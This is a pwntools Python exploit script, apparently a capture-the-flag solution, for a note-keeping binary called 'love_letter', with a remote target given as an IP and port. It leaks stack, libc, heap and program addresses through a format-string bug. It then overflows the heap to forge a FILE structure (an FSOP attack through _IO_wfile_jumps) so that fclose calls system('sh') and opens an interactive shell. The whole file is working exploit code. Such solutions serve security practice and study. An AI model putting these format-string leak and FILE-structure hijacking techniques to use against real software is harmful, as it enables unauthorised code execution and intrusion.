#!/usr/bin/env python3
from pwn import *
from subprocess import Popen

# =========================================================
#                          SETUP                         
# =========================================================
exe = './love_letter'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = "94.237.60.55", 59962


gdbscript = '''
init-pwndbg
b *_IO_file_close_it + 104
c
'''.format(**locals())

def initialize(argv=[]):
    global pid
    if args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe] + argv)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/love_letter"]).recvall().strip().decode()
        return p
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    else:
        return process([exe] + argv, aslr=False)

def debug():
    global gdbscript, pid
    if args.QEMU:
        gdb_args = ["tmux", "splitw", "-h", "-p", "65", "gdb"]
        for cmd in [item for line in gdbscript.strip().splitlines() if (item := line.strip())]:
            gdb_args.extend(["-ex", cmd])
        Popen(gdb_args)
    elif args.DOCKER:
        gdbscript = f'''
        init-pwndbg
        set sysroot /proc/{pid}/root
        b *_IO_file_close_it + 104
        c
        '''.format(**locals())        
        attach(int(pid), gdbscript=gdbscript, sysroot=f"/proc/{pid}/root", exe='love_letter')
    else:
        attach(io, gdbscript=gdbscript)


# =========================================================
#                         EXPLOITS
# =========================================================
def create_note(name, note, protect=False, password=b"anythin"):
    io.sendlineafter(b': ', b'1')
    io.sendlineafter(b'> ', name)
    io.sendlineafter(b'> ', note)
    if protect:
        io.sendlineafter(b'> ', b'y')
        io.sendlineafter(b'> ', password)
    else:
        io.sendlineafter(b'> ', b"n")

def change_note(idx, author, note):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b'> ', str(idx).encode())
    io.sendlineafter(b': ', author)
    io.sendlineafter(b': ', note)

def view_note(idx):
    io.sendlineafter(b': ', b'3')
    io.sendlineafter(b'> ', str(idx).encode())

def delete_note(idx):
    io.sendlineafter(b': ', b'4')
    io.sendlineafter(b'> ', str(idx).encode())

def save_note(content):
    io.sendlineafter(b': ', b'5')
    io.sendlineafter(b'> ', content)

def fsrop(fp=libc.sym._IO_2_1_stdout_, offset=0x18):
    fs = FileStructure()
    fs.flags = b"  sh".ljust(0x8,b"\x00")   
    fs._IO_read_end = fp
    fs._lock = fp+0x100
    fs._wide_data = fp - 0x10
    fs.unknown2 = p64(0)*3 + p64(1) + p64(libc.sym.system) + p64(fp + 0x60)
    fs.vtable = libc.sym._IO_wfile_jumps - 0x88 + offset
    return bytes(fs)


def exploit():
    global io
    io = initialize()
    with log.progress("Leak address via format string"), context.silent:
        create_note(b"%1$p", b"")
        view_note(1)
        io.recvuntil(b"Author: ")
        stack = int(io.recvline().strip(),16)

        change_note(1, b"%3$p", b"")
        view_note(1)
        io.recvuntil(b"Author: ")
        libc_leak = int(io.recvline().strip(),16)
        libc.address = libc_leak - (libc.sym["write"] + 23)

        change_note(1, b"%7$p", b"")
        view_note(1)
        io.recvuntil(b"Author: ")
        heap_leak = int(io.recvline().strip(),16)
        heap_base = heap_leak & ~0xfff
        fp = heap_base + 0x19b0
        change_note(1, b"%11$p", b"")
        view_note(1)
        io.recvuntil(b"Author: ")
        main_leak = int(io.recvline().strip(),16)
        elf.address = main_leak - (elf.sym['main'] + 121)
    log.info("Stack address: %#x", stack)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base address: %#x", libc.address)
    log.info("Heap base address: %#x", heap_base)
    log.info("File Pointer: %#x", fp)
    log.info("Main leak: %#x", main_leak)
    log.info("ELF base address: %#x", elf.address)
    with log.progress("Heap overflow the fp and hijack fclose to get shell"):
        payload = b"A"*0x100 + p64(0x0) + p64(0x1e1) + fsrop(fp)
        save_note(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
